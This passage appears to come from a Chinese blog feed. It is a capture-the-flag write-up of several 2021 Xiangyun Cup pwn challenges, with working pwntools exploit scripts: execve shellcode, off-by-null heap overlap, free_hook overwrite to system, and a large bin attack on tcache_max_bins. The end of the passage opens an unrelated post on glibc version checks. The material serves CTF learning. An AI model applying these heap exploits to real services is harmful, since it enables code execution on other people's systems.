p64(<span class="hljs-number">0x450</span>) + p64(<span class="hljs-number">0x100000020</span>) + p64(<span class="hljs-number">0x0</span>)<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x01\x01&#x27;</span>,<span class="hljs-number">0x20</span>,payload)<br>    free(<span class="hljs-number">0</span>)<br>	free(<span class="hljs-number">1</span>)<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>)<br>	add2(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>,<span class="hljs-number">0x20</span>)<br>pwn()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">while True:</span><br><span class="hljs-string">	try:</span><br><span class="hljs-string">		p = process(&quot;./lemon_pwn&quot;)</span><br><span class="hljs-string">		pwn()</span><br><span class="hljs-string">		aaa = (&quot;or corruption (!prev):&quot;)</span><br><span class="hljs-string">		print aaa</span><br><span class="hljs-string">		if &quot;flag&quot; in aaa:</span><br><span class="hljs-string">			pause()</span><br><span class="hljs-string">	except:</span><br><span class="hljs-string">		p.close()</span><br><span class="hljs-string">		continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<h2 id="JigSaw’sCage"><a href="#JigSaw’sCage" class="headerlink" title="JigSaw’sCage"></a>JigSaw’sCage</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090309078.png"><span class="image-caption">image-20210921090309078</span></p>
<p>常规checksec，64位保护全开</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090356101.png"><span class="image-caption">image-20210921090356101</span></p>
<p>这里的choice是int类型，而输入却是可以输入8字节长度的数据，而v2就是choice相邻的高32位的数据，覆盖v2大于14会得到一块可以执行的堆内存</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090223446.png"><span class="image-caption">image-20210921090223446</span></p>
<p>如上图所示，堆块可执行了</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090636446.png"><span class="image-caption">image-20210921090636446</span></p>
<p>并且存在着功能，是可以执行堆块的，所以可以往堆块上写shellcode</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090735583.png"><span class="image-caption">image-20210921090735583</span></p>
<p>但是，堆块只能生成0x10的堆块，所以直接写入可以getshell的shellcode长度是肯定不够的，至少要二十多个字节长度才行，所以这时候一般可以先看看寄存器有没有什么可以直接利用的脏数据，减少shellcode书写的长度</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921095449264.png"><span class="image-caption">image-20210921095449264</span></p>
<p>断点下在test函数要执行堆块内容的那步，查看在这时寄存器存了哪些脏数据</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921095610649.png"><span class="image-caption">image-20210921095610649</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921100019587.png"><span class="image-caption">image-20210921100019587</span></p>
<p>能发现，R10保存的是一个libc上的地址，所以可以借用这个值去计算free_hook以及system的值，然后再找个寄存器，进行两次执行操作，把system写入free_hook中，然后释放一块写有’/bin/sh’的堆块即可</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921100059193.png"><span class="image-caption">image-20210921100059193</span></p>
<p>另外一种shellcode就是直接getshell，需要更多的观察</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101332945.png"><span class="image-caption">image-20210921101332945</span></p>
<p>可以发现，RDX里面的值是堆上的地址，那么我们就可以往堆上写入/bin/sh\x00，然后再计算偏移，传入RDI，再将RDX清零，把59传入al，最后系统调用即可，但是因为长度有限，所以我们一定要注意</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101858450.png"><span class="image-caption">image-20210921101858450</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101917761.png"><span class="image-caption">image-20210921101917761</span></p>
<p>同样getshelll</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./JigSAW&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;iNput:&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execve</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.sendlineafter(<span class="hljs-string">&quot;Name:\n&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Make your Choice:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1095216660480&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">code1 = asm(&quot;add r10, 0x50068; mov r12, r10;&quot;)</span><br><span class="hljs-string">code2 = asm(&quot;sub r10, 0x1496b0; mov qword ptr [r12], r10&quot;)</span><br><span class="hljs-string">add(0)</span><br><span class="hljs-string">add(1)</span><br><span class="hljs-string">add(2)</span><br><span class="hljs-string">edit(0,code1)</span><br><span class="hljs-string">edit(1,code2)</span><br><span class="hljs-string">edit(2,&#x27;/bin/sh\x00&#x27;)</span><br><span class="hljs-string">debug()</span><br><span class="hljs-string">execve(0)</span><br><span class="hljs-string">execve(1)</span><br><span class="hljs-string">free(2)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	add dl,0x20;</span><br><span class="hljs-string">	push rsi;</span><br><span class="hljs-string">	pop rdi;</span><br><span class="hljs-string">	xchg rdi,rdx;</span><br><span class="hljs-string">	push rsi;</span><br><span class="hljs-string">	pop rax;</span><br><span class="hljs-string">	mov al,59;ls</span><br><span class="hljs-string">	syscall;</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span><br>	)<br>add(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>)<br>add(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br>debug()<br>execve(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="PassWordBox-FreeVersion"><a href="#PassWordBox-FreeVersion" class="headerlink" title="PassWordBox_FreeVersion"></a>PassWordBox_FreeVersion</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228191615313.png"><span class="image-caption">image-20220228191615313</span></p>
<p>保护全开，64位，glibc2.27版本</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228191813211.png"><span class="image-caption">image-20220228191813211</span></p>
<p>刚开始会获得一个随机数，是在后面被用来加密堆块内容的</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228191752308.png"><span class="image-caption">image-20220228191752308</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228191955700.png"><span class="image-caption">image-20220228191955700</span></p>
<p>在add里面，存在offbynull漏洞，fgets会溢出一个0，借此制造出堆块重叠，加密函数只做了简单的异或处理，并且第一个堆块就帮我们打印出堆块的内容，而已知0与任何数进行异或，都是数本身，从而获得到异或的key值。而这个key值要用在我们输入地址、构造prev_addr时候都需要先异或处理，使得输入的内容不会被异或。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228192118841.png"><span class="image-caption">image-20220228192118841</span></p>
<p>在show功能里面， 都会先进行异或处理，然后在打印出堆块内容，所以我们后面泄露libc都需要再进行一次的异或还原。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228192745738.png"><span class="image-caption">image-20220228192745738</span></p>
<p>free功能中堆块地址是保留的，并未被清除。</p>
<p>其他的自行调试，没什么难度了，正常的getshell方式。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228191101438.png"><span class="image-caption">image-20220228191101438</span></p>
<p>虽然执行到了system(“/bin/sh”)，却没能打通。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwdFree&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Input The ID You Want Save:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&quot;Length Of Your Pwd:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Your Pwd:&quot;</span>)<br>    p.sendline(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Which PwdBox You Want Check:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Idx you want 2 Delete:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Save ID:&#x27;</span>)<br>p.recv(<span class="hljs-number">8</span>)<br>key = u64(p.recv(<span class="hljs-number">8</span>))<br>log.info(<span class="hljs-string">&quot;key==&gt;0x%x&quot;</span> %key)<br><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, <span class="hljs-number">12</span>):<br>    add(i, <span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, <span class="hljs-number">12</span>):<br>    free(i)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x160</span>^key))<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">4</span>) <span class="hljs-comment">#合并</span><br><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#按照索引顺序，以防乱了</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, <span class="hljs-number">11</span>):<br>    add(i, <span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Pwd is: &quot;</span>)<br>base = u64(p.recv(<span class="hljs-number">8</span>))^key<br>base -= <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %base)<br>free_hook = base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">11</span>)<br>edit(<span class="hljs-number">2</span>, p64(free_hook))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x28</span>, p64(sys^key))<br>add(<span class="hljs-number">13</span>, <span class="hljs-number">0x28</span>, p64(<span class="hljs-number">0x68732f6e69622f</span>^key))<br><br>free(<span class="hljs-number">13</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="PassWordBox-ProVersion"><a href="#PassWordBox-ProVersion" class="headerlink" title="PassWordBox_ProVersion"></a>PassWordBox_ProVersion</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228194718202.png"><span class="image-caption">image-20220228194718202</span></p>
<p>64位，glibc版本2.31，函数功能跟上题差不多，所以只分析不同的部分。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304091635089.png"><span class="image-caption">image-20220304091635089</span></p>
<p>申请的堆的大小只能为large chunk了，同时 offbynull 修复。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304091812982.png"><span class="image-caption">image-20220304091812982</span></p>
<p>edit功能不再限制次数。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304091900358.png"><span class="image-caption">image-20220304091900358</span></p>
<p>delete存在UAF漏洞。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304091916950.png"><span class="image-caption">image-20220304091916950</span></p>
<p>新增功能recover，看着功能像是为了帮助UAF更加的UAF</p>
<p>刚开始最先仍然是用相同的手法进行泄露出key值，后续的利用手法才有改变，要使用large bin attack了。</p>
<p>在利用前，引入一个有意思的机制，看看tcache_perthread_struct结构体的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS                64</span><br><br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure>

<p>tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk，counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk；tcache_entry数组的大小为TCACHE_MAX_BINS，是 tcache 的最大数量，宏定义为64，如果结合large bin attack，我们可以将这个TCACHE_MAX_BINS数改成一个大数，那么几乎每个 chunk 块 free 之后都会进入 tcache。该结构具体位置按下图方式可以查找到。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304094405889.png"><span class="image-caption">image-20220304094405889</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304104133443.png"><span class="image-caption">image-20220304104133443</span></p>
<p>利用 large bin attack 成功修改 tcache_max_bins 值。然后就是把 large chunk 放入到tcache中，借着UAF修改fd指针，申请堆块到free_hook 上即可</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304110037381.png"><span class="image-caption">image-20220304110037381</span></p>
<p>成功</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwdPro&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Which PwdBox You Want Add:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&quot;Input The ID You Want Save:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&quot;Length Of Your Pwd:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Your Pwd:&quot;</span>)<br>    p.sendline(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Which PwdBox You Want Edit:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Which PwdBox You Want Check:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Idx you want 2 Delete:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recov</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Idx you want 2 Recover:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x460</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Save ID:&#x27;</span>)<br>p.recv(<span class="hljs-number">8</span>)<br>key = u64(p.recv(<span class="hljs-number">8</span>))<br>log.info(<span class="hljs-string">&quot;key==&gt;0x%x&quot;</span> %key)<br><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x500</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x450</span> ,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>recov(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Pwd is: &quot;</span>)<br>base = (u64(p.recv(<span class="hljs-number">8</span>))^key) - <span class="hljs-number">0x1ebbe0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %base)<br>free_hook = base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>tcache_max_bins = base + <span class="hljs-number">0x1eb2d0</span><br><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Pwd is: &quot;</span>)<br>fd = u64(p.recv(<span class="hljs-number">8</span>))^key<br>p.recv(<span class="hljs-number">8</span>)<br>fd_nextsize = u64(p.recv(<span class="hljs-number">8</span>))^key<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>, p64(fd)*<span class="hljs-number">2</span> + p64(fd_nextsize) + p64(tcache_max_bins - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x500</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">3</span>)<br>recov(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>, p64(free_hook))<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x500</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x500</span>, p64(sys^key))<br>edit(<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">5</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>复现思路来源：<a href="https://blog.csdn.net/woodwhale/article/details/120635062">https://blog.csdn.net/woodwhale/article/details/120635062</a></p>
]]></content>
      <tags>
        <tag>祥云杯PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>libc版本检查机制</title>
    <url>/2021/08/30/2021-08-30-libc%E7%89%88%E6%9C%AC%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇本章是以libc-2.23.so为基础，去对比之后版本的差异问题</p>
<h2 id="libc-2-27-so"><a href="#libc-2-27-so" class="headerlink" title="libc-2.27.so"></a>libc-2.27.so</h2><h3 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h3><p>tcache是在libc-2.27.so引进的一种新机制</p>
<h4 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a><strong>tcache_entry</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>

